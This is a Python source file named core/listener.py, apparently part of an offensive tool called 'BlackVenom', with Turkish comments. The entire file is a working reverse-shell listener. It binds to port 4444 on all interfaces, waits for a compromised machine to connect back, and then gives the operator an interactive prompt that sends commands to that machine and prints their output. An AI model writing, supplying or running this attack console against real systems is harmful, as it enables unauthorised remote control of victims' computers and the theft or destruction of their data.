# core/listener.py

import socket
import threading

def start_listener(host: str = "0.0.0.0", port: int = 4444):
    """
    Belirtilen IP ve port üzerinden shell listener başlatır.

    :param host: Dinlenecek IP (varsayılan: tüm IP’ler)
    :param port: Dinlenecek port
    """

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)

    print(f"[+] BlackVenom dinleniyor... {host}:{port}")
    client_socket, addr = server.accept()
    print(f"[!] Shell düştü! Bağlantı geldi: {addr[0]}:{addr[1]}")

    shell_session(client_socket)


def shell_session(client_socket):
    """
    Basit shell arayüzü. Komut gönderip çıktı alır.
    """
    try:
        while True:
            cmd = input("BlackVenom$ ")
            if cmd.lower() in ["exit", "quit"]:
                client_socket.send(b"exit\n")
                break
            client_socket.send((cmd + "\n").encode())
            response = recv_all(client_socket)
            print(response)
    except KeyboardInterrupt:
        print("\n[!] Çıkılıyor...")
    finally:
        client_socket.close()


def recv_all(sock):
    """
    Tüm veriyi okur.
    """
    data = b""
    sock.settimeout(1.0)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except:
        pass
    return data.decode(errors="ignore")
